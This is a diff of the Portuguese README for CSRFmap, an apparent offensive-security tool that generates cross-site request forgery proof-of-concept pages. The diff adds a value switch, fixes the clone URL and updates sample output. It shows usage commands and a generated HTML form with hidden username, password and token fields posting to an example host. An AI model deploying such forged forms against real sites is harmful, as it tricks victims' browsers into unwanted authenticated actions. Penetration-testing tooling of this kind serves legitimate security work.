@@ -28,7 +28,7 @@ Projetei o `CSRFmap`  e mantive um modelo consistentemente passivo para torná-l
 # Forma de utilização
 
 ```sh
-python3 CSRFmap.py -a "http://exemplo.com" -m post -t forminteraction -n username password token
+python3 CSRFmap.py -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
@@ -42,10 +42,11 @@ Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele s
 
 options:
   -h, --help            show this help message and exit
-  -a ACTION, -A ACTION
-  -m METHOD, -M METHOD
-  -pl {form_interaction,form_no_interaction,json_request,json_credentials}
-  -n NAME [NAME ...], -name NAME [NAME ...]
+  -a ACTION, -A ACTION  Insert action
+  -m METHOD, -M METHOD  Insert method
+  -p {form1,form2,json1,json2}
+  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
+  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
 
 ```
 
@@ -54,13 +55,13 @@ options:
 CSRFmap requer **python3** e para baixá-lo só usar:
 
 ```sh
-git clone https://github.com/joaoviictorti/Revshell
+git clone https://github.com/joaoviictorti/CSRFmap
 ```
 
 # Executando CSRFmap
 
 ```console
-python3 CSRFmap.py -a "http://exemplo.com" -m post -pl form_interaction -n username password token
+python3 CSRFmap.py -a "http://exemplo.com" -m post -p form_interaction -n username password token -v victor password 132423542
 
   ____________  ____              
  / ___/ __/ _ \/ __/_ _  ___ ____ 
@@ -68,7 +69,7 @@ python3 CSRFmap.py -a "http://exemplo.com" -m post -pl form_interaction -n usern
 \___/___/_/|_/_/ /_/_/_/\_,_/ .__/
                            /_/ 
                            Autor: joaovictorti
-                           version: 1.0 
+                           version: 1.1
                                                
 
 csrf.html:
@@ -76,9 +77,9 @@ csrf.html:
 <html lang="pt-br">
 <body>
 	<form action="http://exemplo.com" method="post">
-	<input name="username" value="__valor__" type="hidden"/>
-	<input name="password" value="__valor__" type="hidden"/>
-	<input name="token" value="__valor__" type="hidden"/>
+	<input name="username" value="victor" type="hidden"/>
+	<input name="password" value="password" type="hidden"/>
+	<input name="token" value="132423542" type="hidden"/>
 	<input type="submit">Enviar</input>
 	</form>
 </body>
